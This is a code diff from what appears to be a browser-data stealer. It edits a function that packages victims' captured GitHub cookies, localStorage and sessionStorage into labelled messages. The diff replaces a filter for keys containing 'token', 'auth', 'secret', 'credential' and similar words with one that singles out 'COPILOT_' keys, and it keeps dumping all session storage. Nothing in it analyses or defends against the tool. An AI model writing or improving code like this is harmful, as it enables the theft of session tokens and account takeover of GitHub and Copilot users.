@@ -437,12 +437,11 @@ function buildGithubMessages({ parsedCookies, capturedLocalStorage, capturedSess
   }
 
   if (lsKeys.length > 0) {
-    const importantPatterns = ['token', 'copilot', 'auth', 'session', 'key', 'secret', 'credential', 'billing'];
-    const importantKeys = lsKeys.filter(k => importantPatterns.some(p => k.toLowerCase().includes(p)));
-    const otherLsKeys = lsKeys.filter(k => !importantKeys.includes(k));
-    const impMsgs = buildStorageMessages('🐙 GITHUB IMPORTANT localStorage (' + importantKeys.length + ') 🐙', '🔐', capturedLocalStorage, importantKeys);
-    const otherMsgs = buildStorageMessages('🐙 GITHUB OTHER localStorage (' + otherLsKeys.length + ') 🐙', '💾', capturedLocalStorage, otherLsKeys);
-    msgs.push(...impMsgs, ...otherMsgs);
+    const copilotKeys = lsKeys.filter(k => k.toUpperCase().startsWith('COPILOT_'));
+    if (copilotKeys.length > 0) {
+      const copilotMsgs = buildStorageMessages('🐙 GITHUB COPILOT localStorage (' + copilotKeys.length + ') 🐙', '🔐', capturedLocalStorage, copilotKeys);
+      msgs.push(...copilotMsgs);
+    }
   }
 
   msgs.push(...buildStorageMessages(`🐙 GITHUB sessionStorage (${ssKeys.length}) 🐙`, '📝', capturedSessionStorage, ssKeys));
